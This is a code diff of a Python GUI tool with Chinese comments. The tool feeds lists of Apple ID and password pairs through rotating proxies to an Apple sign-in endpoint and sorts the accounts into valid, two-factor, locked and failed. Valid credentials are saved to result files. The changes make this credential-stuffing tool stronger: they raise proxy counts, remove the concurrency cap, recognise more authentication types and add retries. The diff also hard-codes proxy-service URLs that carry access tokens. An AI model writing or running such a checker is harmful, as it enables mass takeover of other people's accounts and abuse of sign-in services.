@@ -5,28 +5,50 @@ import PySimpleGUI as sg
 import os
 from datetime import datetime
 import logging
+import colorlog
 import json
 
-# 在程序的开始处创建异步事件循环
-loop = asyncio.get_event_loop()
 # Configure logging
+# 设置基础配置（这将影响所有没有特别配置的logger）
 logging.basicConfig(level=logging.INFO)
+# 创建logger
 logger = logging.getLogger(__name__)
 # 创建文件处理器，指定日志文件的名称和写入模式
 file_handler = logging.FileHandler('my_log_file.log', mode='a')
-# 设置日志格式
-formatter = logging.Formatter(
+# 设置文件日志格式
+file_formatter = logging.Formatter(
     '%(asctime)s - %(threadName)s - %(name)s - %(levelname)s - %(message)s')
-file_handler.setFormatter(formatter)
-# 将文件处理器添加到日志记录器
+file_handler.setFormatter(file_formatter)
+# 将文件处理器添加到logger
 logger.addHandler(file_handler)
+
+# 创建控制台处理器
+console_handler = logging.StreamHandler()
+console_handler.setLevel(logging.INFO)
+# 设置控制台日志颜色格式
+console_formatter = colorlog.ColoredFormatter(
+    "%(log_color)s%(asctime)s - %(threadName)s - %(name)s - %(levelname)s - %(message)s",
+    datefmt=None,
+    reset=True,
+    log_colors={
+        'DEBUG':    'cyan',
+        'INFO':     'green',
+        'WARNING':  'yellow',
+        'ERROR':    'red',
+        'CRITICAL': 'red,bg_white'
+    },
+    secondary_log_colors={},
+    style='%'
+)
+console_handler.setFormatter(console_formatter)
+# 将控制台处理器添加到logger
+logger.addHandler(console_handler)
 
 
 # 创建统计数据类
 # 使用asyncio.Lock来确保在异步环境中对统计数据的访问和修改是线程安全的。
 class Statistics:
     def __init__(self):
-        print("实例化Statistics类...")
         self.data = {"total": 0, "correct": 0,
                      "2fa": 0, "locked": 0, "error": 0}
         self.processed_accounts = 0
@@ -36,11 +58,12 @@ class Statistics:
         async with self.lock:
             if key in self.data:
                 self.data[key] += value
-            logger.info(f"Updated {key}: {self.data[key]}")
+            # logger.info(f"Updated {key}: {self.data[key]}")
 
-    async def increment_total(self):
+    async def increment_processed_accounts(self):
         async with self.lock:
-            self.processed_accounts += 1
+            # self.processed_accounts += 1
+            self.processed_accounts = self.data["correct"] + self.data["2fa"] + self.data["locked"] + self.data["error"]
             # self.data["total"] = self.processed_accounts
 
     async def get_stats(self):
@@ -60,21 +83,23 @@ logger.info(f"创建结果文件夹: {folder_name}")
 
 # 更新GUI界面
 async def update_gui(window, stats):
+    global is_running
     while True:
         await asyncio.sleep(0.5)    # 每隔0.5秒更新一次
-        try:
-            current_stats, processed_accounts = await stats.get_stats()
-            for key, value in current_stats.items():
-                window[f"-{key.upper()}-"].update(value)
+        if is_running:
+            try:
+                current_stats, processed_accounts = await stats.get_stats()
+                for key, value in current_stats.items():
+                    window[f"-{key.upper()}-"].update(value)
 
-            # 更新进度条
-            total_accounts = int(window['-TOTAL-'].get())
-            if total_accounts > 0:  # 避免除以零
-                progress = (processed_accounts / total_accounts) * 100
-                window['progress'].update_bar(progress, 100)
-        except Exception as e:
-            logger.error(f"Failed to update GUI: {e}")
-            break
+                # 更新进度条
+                total_accounts = int(window['-TOTAL-'].get())
+                if total_accounts > 0:  # 避免除以零
+                    progress = (processed_accounts / total_accounts) * 100
+                    window['progress'].update_bar(progress, 100)
+            except Exception as e:
+                logger.error(f"Failed to update GUI: {e}")
+                break
 
 # 定义窗口的内容和布局
 row1 = [sg.Text("总数", size=(8, 1)),
@@ -132,19 +157,21 @@ def run_async(coroutine, window):
 
 # 启动 GUI 更新线程
 run_async(update_gui(window, stats), window)
-# update_thread = threading.Thread(
-#     target=update_gui, args=(window, stats,), daemon=True)
-# update_thread.start()
 
 
 # 创建文件写入函数
+def write_to_processed_file(apple_id, password):
+    with open(f'results/{folder_name}/已处理.txt', 'a') as file:
+        file.write(f"{apple_id}----{password}\n")
+
+
 def write_to_correct_file(apple_id, password):
-    with open(f'results/{folder_name}/correct.txt', 'a') as file:
+    with open(f'results/{folder_name}/密正.txt', 'a') as file:
         file.write(f"{apple_id}----{password}\n")
 
 
 def write_to_two_factor_file(apple_id, password):
-    with open(f'results/{folder_name}/2fa.txt', 'a') as file:
+    with open(f'results/{folder_name}/双重.txt', 'a') as file:
         file.write(f"{apple_id}----{password}\n")
 
 
@@ -170,7 +197,7 @@ class ProxyPool:
                                     await self.proxy_queue.put(proxy.strip())
                         except Exception as e:
                             logger.error(f"Failed to fetch proxies: {e}")
-            await asyncio.sleep(2)  # 等待一段时间再次检查
+            await asyncio.sleep(1)  # 等待一段时间再次检查
 
     async def get_proxy(self):
         return await self.proxy_queue.get()
@@ -191,19 +218,27 @@ class AccountPool:
         self.account_queue = asyncio.Queue()
         self.processed_accounts = set()  # 使用集合来确保不会重复
         self.stats = stats
+        self.retry_counts = {}      # 用于记录帐号重试次数
 
     async def load_accounts(self, file_path):
         account_count = 0
+        unique_accounts = set()  # 用于存储已加载的唯一账号密码对
+
         try:
             with open(file_path, 'r') as file:
                 for line in file:
                     apple_id, password = line.strip().split('----')
-                    if apple_id not in self.processed_accounts:  # 检查是否已经处理过
-                        await self.account_queue.put((apple_id, password))
-                        self.processed_accounts.add(apple_id)
+                    account_pair = (apple_id, password)  # 创建一个元组来表示账号密码对
+
+                    # 检查账号密码对是否已存在
+                    if account_pair not in unique_accounts:
+                        unique_accounts.add(account_pair)  # 添加新的账号密码对
+                        await self.account_queue.put(account_pair)
                         account_count += 1
-                        # 添加日志记录以确认账号密码对被加入队列
                         logger.info(f"Account added to queue: {apple_id}")
+                    else:
+                        logger.info(f"Duplicate account skipped: {apple_id}")
+
             await self.stats.set_total(account_count)
         except Exception as e:
             logger.error(f"Error loading accounts: {e}")
@@ -211,13 +246,18 @@ class AccountPool:
     async def get_account(self):
         return await self.account_queue.get() if not self.account_queue.empty() else None
 
-    # 用于在重新加入队列之前标记帐号已经处理过, 以避免重复处理
-    def mark_account_processed(self, apple_id):
-        self.processed_accounts.add(apple_id)
+    # 用于在重新加入队列之前增加帐号的重试次数
+    def increment_retry_count(self, apple_id):
+        """增加帐号的重试次数，并返回新的重试次数"""
+        if apple_id in self.retry_counts:
+            self.retry_counts[apple_id] += 1
+            if self.retry_counts[apple_id] >= 10:
+                self.processed_accounts.add(apple_id)
+        else:
+            self.retry_counts[apple_id] = 1
+        logger.warning(f"帐号 {apple_id} 重试次数: {self.retry_counts[apple_id]}")
+        return self.retry_counts[apple_id]
 
-    # 用于在重新加入队列之前检查帐号是否已经处理过, 以避免重复处理
-    def is_account_processed(self, apple_id):
-        return apple_id in self.processed_accounts
 
 # 定义共享状态标志
 stop_event = asyncio.Event()
@@ -239,39 +279,38 @@ class AsyncAppleIDChecker:
         self.proxy_pool = proxy_pool
         self.account_pool = account_pool
         self.stats = stats
-        self.session = aiohttp.ClientSession(headers=self.HEADERS)
+        self.session = None
 
     async def check_account(self):
+        # 确保每次使用 session 时都在当前的异步事件循环中创建
+        if not self.session:
+            self.session = aiohttp.ClientSession(headers=self.HEADERS)
         while not stop_event.is_set():
             account = await self.account_pool.get_account()
 
             if account is None:
                 break  # 如果队列为空，则退出循环
             apple_id, password = account
+
             proxy_ip = await self.proxy_pool.get_proxy()
             proxy = f"http://{proxy_ip}"
-            # aiohttp 不支持代理IP的格式为字典，所以这里使用字符串格式
-            # proxy = {
-            #     "http": f"http://{proxy_ip}",
-            #     "https": f"http://{proxy_ip}"
-            # }
+
             try:
                 async with self.session.post(self.URL, json={"accountName": apple_id, "password": password, "rememberMe": False}, proxy=proxy) as response:
                     response_text = await response.text()
                     # logger.info(f"响应内容: {response_text}")
+                    # self.account_pool.mark_account_processed(apple_id)      # 标记帐号已经处理过
                     return await self.process_response(apple_id, password, response_text)
-            except aiohttp.ClientError as e:
-                logger.error(f"HTTP错误: {e}")
-                # 错误处理: 重新加入队列并更换代理
-                await self.account_pool.account_queue.put(account)
-                logger.info(f"重新加入队列: {account}")
-                await asyncio.sleep(0.1)  # 短暂等待后重试
             except Exception as e:
                 logger.error(f"其他错误: {e}")
                 # 错误处理: 重新加入队列并更换代理
-                await self.account_pool.account_queue.put(account)
-                logger.info(f"重新加入队列: {account}")
-                await asyncio.sleep(0.1)
+                # 如果帐号没有超过最大重试次数，重新加入队列
+                if self.account_pool.increment_retry_count(apple_id) <= 10:
+                    await self.account_pool.account_queue.put(account)
+                    logger.warning(f"重新加入队列: {account}")
+
+            await asyncio.sleep(0.2)  # 短暂等待后重试
+
             account = self.account_pool.get_account()
             # 定期检查是否应该停止
             if stop_event.is_set():
@@ -281,60 +320,62 @@ class AsyncAppleIDChecker:
         # global stats
         try:
             response_json = json.loads(response_text)
-        except json.JSONDecodeError:
-            # If response is not JSON, it's an unknown error
-            logger.error(
-                f'Non-JSON response for AppleID -> {apple_id}:{password} | {response_text}')
-            await self.stats.update("error", 1)
-            await self.stats.increment_total()
-            return {"status": "未知错误", "message": "返回内容格式异常，无法解析为JSON。"}
+            write_to_processed_file(apple_id, password)
+        # except json.JSONDecodeError:
+        #     # If response is not JSON, it's an unknown error
+        #     logger.error(
+        #         f'Non-JSON response for AppleID -> {apple_id}:{password} | {response_text}')
+        #     await self.stats.update("error", 1)
+        #     await self.stats.increment_processed_accounts()
+        #     return {"status": "未知错误", "message": "返回内容格式异常，无法解析为JSON。"}
         except Exception as e:
             logger.error(f"处理响应时发生未知错误：{e}")
             await self.stats.update("error", 1)
-            await self.stats.increment_total()
+            await self.stats.increment_processed_accounts()
             return {"status": "未知错误", "message": "处理响应时发生未知错误。"}
 
-        if response_json.get('authType') == "non-sa":
+        if response_json.get('authType') in ["non-sa", "restricted"]:
             logger.info(
-                f'密码正确 NO 2FA AppleID -> {apple_id}:{password}｜{response_text}')
+                f'密码正确 NO 2FA AppleID -> {apple_id}:{password}')
             await self.stats.update("correct", 1)
-            await self.stats.increment_total()
+            await self.stats.increment_processed_accounts()
             write_to_correct_file(apple_id, password)
             return {"status": "密码正确", "message": "帐号密码正确，无需双重认证。"}
-        elif response_json.get('authType') in ["sa", "hsa2"]:
+        elif response_json.get('authType') in ["sa", "hsa2", "hsa", "2sa", "2sa2"]:
             logger.info(
-                f'双重认证 2FA AppleID -> {apple_id}:{password}｜{response_text}')
+                f'双重认证 2FA AppleID -> {apple_id}:{password}')
             await self.stats.update("2fa", 1)
-            await self.stats.increment_total()
+            await self.stats.increment_processed_accounts()
             write_to_two_factor_file(apple_id, password)
             return {"status": "双重认证", "message": "帐号密码正确，但开启了双重认证。"}
         elif "serviceErrors" in response_json:
             for error in response_json["serviceErrors"]:
                 if error.get("code") == "-20101":
                     logger.info(
-                        f'密码错误 AppleID -> {apple_id}:{password}|{response_text}')
+                        f'密码错误 AppleID -> {apple_id}:{password}')
                     await self.stats.update("error", 1)
-                    await self.stats.increment_total()
+                    await self.stats.increment_processed_accounts()
                     return {"status": "密码错误", "message": "帐号或密码错误。"}
-                if error.get("code") == "-20209":
+                elif error.get("code") == "-20209":
                     logger.info(
-                        f'安全原因帐号被锁 AppleID -> {apple_id}:{password}|{response_text}')
+                        f'安全原因帐号被锁 AppleID -> {apple_id}:{password}')
                     await self.stats.update("locked", 1)
-                    await self.stats.increment_total()
+                    await self.stats.increment_processed_accounts()
                     return {"status": "帐号被锁", "message": "此Apple ID因安全原因已被锁定。"}
         else:
             logger.error(
                 f'错误 AppleID -> {apple_id}:{password}|{response_text}')
             await self.stats.update("error", 1)
-            await self.stats.increment_total()
+            await self.stats.increment_processed_accounts()
             return {"status": "未知错误", "message": "出现未知错误或其他异常情况。"}
 
     async def close(self):
-        await self.session.close()
+        if self.session:
+            await self.session.close()
 
 
 # 使用示例
-async def main(appleid_file_path, proxy_api_url, concurrency, NUM_PROXIES_TO_FETCH=300):
+async def main(appleid_file_path, proxy_api_url, concurrency, NUM_PROXIES_TO_FETCH=1200):
     logger.info("进入main函数，开始检测...")
     proxy_pool = ProxyPool(proxy_api_url, NUM_PROXIES_TO_FETCH)
     await proxy_pool.start()  # 异步启动代理池
@@ -342,10 +383,18 @@ async def main(appleid_file_path, proxy_api_url, concurrency, NUM_PROXIES_TO_FET
     await account_pool.load_accounts(appleid_file_path)     # 异步加载帐号密码对
     checker = AsyncAppleIDChecker(proxy_pool, account_pool, stats)
 
-    while not account_pool.account_queue.empty() and not stop_event.is_set():
-        tasks = [asyncio.create_task(checker.check_account())
-                    for _ in range(min(concurrency, account_pool.account_queue.qsize()))]
-        await asyncio.gather(*tasks)
+    # 启动检测器
+    count_sleep_time = 0
+    while not stop_event.is_set():
+        if not account_pool.account_queue.empty():
+            tasks = [asyncio.create_task(checker.check_account())
+                        for _ in range(min(concurrency, account_pool.account_queue.qsize()))]
+            await asyncio.gather(*tasks)
+        else:
+            count_sleep_time += 1
+            await asyncio.sleep(1)  # 短暂等待，避免密集循环
+            if count_sleep_time > 2:
+                break
         logger.info(f"队列中的数据数量：{account_pool.account_queue.qsize()}")
         logger.info(f"stats: {stats.data}")
 
@@ -365,14 +414,14 @@ while True:
         # 禁用“Start”按钮
         window['Start'].update(disabled=True)
         # 获取GUI输入值
-        # TODO: 添加输入值验证, 例如检查文件是否输入, 代理URL是否为空，线程数量是否为数字等
-        # TODO：添加一个文本框来显示日志
+        DEFAULT_PROXY_API_URL = 'http://api.haiwaidaili.net/abroad?token=b6737956f41a979f6ac2e2a5e2da865e&num=1000&format=1&protocol=http&country=gb&state=bfc&city=Nuits-Saint-Georges&sep=3&csep=&type=datacenter&area=HK'
+        # DEFAULT_PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIpEncrypt?dataType=1&encryptParam=9f9A9DgV7OXgVxE3tqtmm8xrfzbHJWGb6%2FsQJ3YVrT3d%2BQOCcqHCgKqSl1O5XD25m6NgLw7BOxdDgstMXKs5%2FJsDVtrOK9464RkeO2C4YbYCX362oMgZ0Y7Hi%2FmMpF%2FpJi00swVBCOra6hzpaLcciBM7GUr4AlVnA8ao%2BezhC5vfRWzM2F7Ltps73nfwTJGizgNJSea6RpFr0zTvuEvjJfqcwqDOVb1YxPNf7KXEs5g%3D'
         appleid_file_path = values["-APPLEIDFILE-"]
-        proxy_api_url = values["-PROXYURL-"] if values["-PROXYURL-"] else 'https://api.hailiangip.com:8522/api/getIpEncrypt?dataType=1&encryptParam=9f9A9DgV7OXgVxE3tqtmm8xrfzbHJWGb6%2FsQJ3YVrT0X%2FsVO8CHIT0v%2BNyjIbq3zKt2hsrRBfERvf5EcA6CSbFNok3Fu9y1E1AI1bEDtadoQBrFiwnDDQ8yDB1OdpntaWm9wzfGV8l%2FkgnZU1eVBrylp1MpqGWChqtNKfix1MXrBd1HPaJFym4rBQnOJ7ZU9arf5KKS7AFD8J5Z1OJJ%2FWbhiKf6bPqRShUoN9E1%2FgqE%3D'
+        proxy_api_url = values["-PROXYURL-"] if values["-PROXYURL-"] else DEFAULT_PROXY_API_URL
         concurrency_input = values["-THREAD-"]
         concurrency = int(concurrency_input) if concurrency_input.isdigit() else 50
-        if concurrency > 200:
-            concurrency = 200
+        # if concurrency > 300:
+        #     concurrency = 300
         logger.info(f"选择的文件路径是: {appleid_file_path}")
         logger.info(f"代理接口是: {proxy_api_url}")
         logger.info(f"线程数量是: {concurrency}")
@@ -383,18 +432,20 @@ while True:
             continue
         # 标记任务集正在运行
         is_running = True
-        window['-MESSAGES-'].update("正在检测...检测结果实时保存到 {folder_name} 目录中")
+        window['-MESSAGES-'].update(f"正在检测...检测结果实时保存到 {folder_name} 目录中")
 
         # 在单独的线程中运行异步任务
         # 创建并启动异步任务
         coroutine = main(appleid_file_path, proxy_api_url, concurrency)
         run_async(coroutine, window)
-        logger.info("run_async called.")
 
     elif event == '-TASK_COMPLETED-':
-        window['-MESSAGES-'].update(f"检测完成! 检测结果在 {folder_name} 目录中")
         # 任务完成，更新is_running标志
         is_running = False
+        window['progress'].update_bar(100, 100)
+        window.refresh()
+        window['-MESSAGES-'].update(f"检测完成! 检测结果在 {folder_name} 目录中")
+
         # 重新启用“Start”按钮
         window['Start'].update(disabled=False)
 
@@ -407,6 +458,5 @@ while True:
         window['-MESSAGES-'].update("已停止检测")
 
 
-# 清理和关闭
-loop.close()
+# 关闭
 window.close()
